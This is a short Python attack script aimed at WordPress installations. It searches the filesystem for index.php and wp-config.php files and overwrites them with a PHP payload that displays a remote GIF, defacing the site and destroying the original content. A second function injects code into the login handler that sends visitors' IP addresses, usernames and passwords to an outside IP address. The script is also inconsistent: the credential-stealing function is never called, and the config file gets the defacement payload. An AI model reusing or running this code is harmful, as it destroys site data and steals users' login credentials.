#!/usr/bin/env python3

import os

def get_path(f_name):
    founds = []
    for root, dirs, files in os.walk('/',topdown=True):
        for name in files:
            if name == f_name:
                f_path = os.path.abspath(os.path.join(root, name))
                founds.append(f_path)
    if not founds:
        print(f'Cant find the File {f_name} on the System')
        exit(-1)
    return founds

def edit_index(f_path):

    payload = '''<?php
if(false !== ($data = file_get_contents('https://static.wixstatic.com/media/a27d24_579ddbee0b9a413b8d2678837475c879~mv2.gif'))){
  header('Content-type: image/gif');
  echo $data;
}
?>
    '''

    f_data = open(f_path, "w")
    f_data.writelines(payload)
    f_data.close()

def edit_config(f_path):
    payload = "file_get_contents('http://192.168.178.107/x?' . $_SERVER['REMOTE_ADDR'] . ' - ' . $_POST['log'] . ':' . $_POST['pwd']);"
    place = "case 'login':"
    f_data = open(f_path, "r")
    data = f_data.readlines()
    for index, line in enumerate(data, start=0):
        if place in line:
            t = line.rstrip().replace(place,'')
            data[index]=f'{line.rstrip()}\n{t}\t{payload}\n'
    a_file = open('out', "w")
    a_file.writelines(data)
    a_file.close()
    pass

def main():

    # Index.php
    for f_path in get_path('index.php'):
        if 'wordpress' in f_path.lower():
            edit_index(f_path)

    # Wp-Config.php
    for f_path in get_path('wp-config.php'):
        if 'wordpress' in f_path.lower():
            edit_index(f_path)
    
if __name__ == '__main__':
    main()